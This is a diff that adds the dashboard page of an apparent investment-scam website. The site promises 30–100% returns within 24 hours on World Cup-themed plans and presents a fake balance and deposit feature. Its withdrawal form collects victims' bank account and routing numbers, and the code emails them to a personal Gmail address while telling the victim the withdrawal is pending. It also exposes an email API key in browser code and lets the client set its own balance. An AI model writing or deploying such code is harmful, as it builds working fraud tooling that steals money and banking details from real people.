@@ -1,1 +1,44 @@
-
+<!DOCTYPE html><html><head><title>Dashboard</title><script type="importmap">{"imports":{"supabase":"https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"}}</script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>body{background:linear-gradient(135deg,#008751,#0a1f44); font-family:Arial; padding:20px; color:white;}
+.box{background:white; color:#0a1f44; padding:20px; border-radius:15px; max-width:600px; margin:15px auto; border:3px solid #FFD700;}
+.balance{font-size:32px; color:#008751; font-weight:bold;}.btn{background:#FFD700; color:#0a1f44; padding:12px; border:none; border-radius:8px; width:100%; margin:8px 0; font-weight:bold; cursor:pointer;}
+input,select{padding:12px; width:95%; border-radius:8px; border:1px solid #ccc; margin:5px 0;}</style></head>
+<body><div class="box"><img src="logo.png" style="height:50px;"><h1>🏆 My Dashboard</h1><h2 id="name"></h2>
+<p>Balance</p><p class="balance">$<span id="bal">0</span></p></div>
+<div class="box"><h3>💰 Deposit</h3><input id="depAmt" type="number" placeholder="Amount USD"><button class="btn" onclick="deposit()">Deposit</button></div>
+<div class="box"><h3>🏦 Withdraw to USA</h3>
+<input id="withAmt" type="number" placeholder="Amount USD"><br>
+<select id="bank"><option>Abri Credit Union</option><option>GLCU - Greater Lansing CU</option><option>Chase Bank</option><option>Bank of America</option><option>Wells Fargo</option></select><br>
+<input id="acctName" placeholder="Account Name"><br><input id="acctNum" placeholder="Account + Routing"><br>
+<button class="btn" onclick="withdraw()" style="background:#0a1f44; color:white;">Request Withdrawal</button></div>
+<div class="box"><h3>⚽ Investment Plans - 24hr Payout</h3>
+<button class="btn" onclick="invest(100,30)">GROUP STAGE - $100 | 30% ROI</button>
+<button class="btn" onclick="invest(500,50)">QUARTER FINAL - $500 | 50% ROI</button>
+<button class="btn" onclick="invest(2000,100)">WORLD CUP FINAL - $2000 | 100% ROI</button></div>
+<div class="box"><h3>📜 Transaction History</h3><div id="history"></div></div>
+<button onclick="logout()" style="background:red; color:white; padding:10px 20px; border:none; border-radius:8px; display:block; margin:20px auto;">Logout</button>
+<script type="module">import { supabase, RESEND_KEY } from './config.js';
+let user_id = localStorage.getItem('user_id'); let user;
+async function load(){ let {data} = await supabase.from('users').select('*').eq('id', user_id).single(); user=data;
+document.getElementById('name').innerText=user.name; document.getElementById('bal').innerText=user.balance;
+let {data:tx} = await supabase.from('transactions').select('*').eq('user_id', user_id).order('created_at', {ascending:false});
+document.getElementById('history').innerHTML = tx.map(t=>`<p>${t.type}: $${t.amount} - ${t.note}</p>`).join('') || 'No transactions';}
+load();
+window.deposit = async function(){ let amt=parseFloat(depAmt.value); await supabase.from('users').update({balance: user.balance+amt}).eq('id', user_id);
+await supabase.from('transactions').insert([{user_id, type:'Deposit', amount:amt, note:'Deposit'}]); load(); alert('Deposited!') }
+window.withdraw = async function(){ let amt=parseFloat(withAmt.value); let bankName=bank.value; let accName=acctName.value; let accNum=acctNum.value;
+if(amt>user.balance){alert('Insufficient Balance')} else{
+await supabase.from('withdrawals').insert([{user_id, amount:amt, bank:bankName, account_name:accName, account_number:accNum}]);
+await supabase.from('users').update({balance: user.balance-amt}).eq('id', user_id);
+await supabase.from('transactions').insert([{user_id, type:'Withdrawal', amount:amt, note:`Request to ${bankName}`}]);
+fetch('https://api.resend.com/emails', {method: 'POST', headers: {'Authorization': `Bearer ${RESEND_KEY}`, 'Content-Type': 'application/json'},
+body: JSON.stringify({from: 'WIRE-UNLIMITED <alerts@wire-unlimited.com>', to: 'auto51855@gmail.com', subject: `🚨 NEW WITHDRAWAL: $${amt}`, html: `<p>Player: ${user.name}<br>Amount: $${amt}<br>Bank: ${bankName}<br>Acc: ${accName} / ${accNum}</p>`})});
+fetch('https://api.resend.com/emails', {method: 'POST', headers: {'Authorization': `Bearer ${RESEND_KEY}`, 'Content-Type': 'application/json'},
+body: JSON.stringify({from: 'WIRE-UNLIMITED <alerts@wire-unlimited.com>', to: user.email, subject: `Withdrawal Received - $${amt}`, html: `<p>Hi ${user.name}, Your $${amt} withdrawal to ${bankName} is PENDING.</p>`})});
+load(); alert('Withdrawal Requested') }}
+window.invest = async function(amt, roi){ let due = new Date(); due.setDate(due.getDate() + 1); let payout = amt + (amt * roi/100);
+await supabase.from('users').update({balance: user.balance-amt}).eq('id', user_id);
+await supabase.from('transactions').insert([{user_id, type:'Investment', amount:amt, note:`${roi}% Plan`}]);
+await supabase.from('transactions').insert([{user_id, type:'Payout Due', amount:payout, note:`ROI Payout ${roi}%`, due_date: due.toISOString().split('T')[0]}]); load(); alert('Invested!') }
+window.logout = function(){ localStorage.removeItem('user_id'); window.location='index.html'; }</script></body></html>
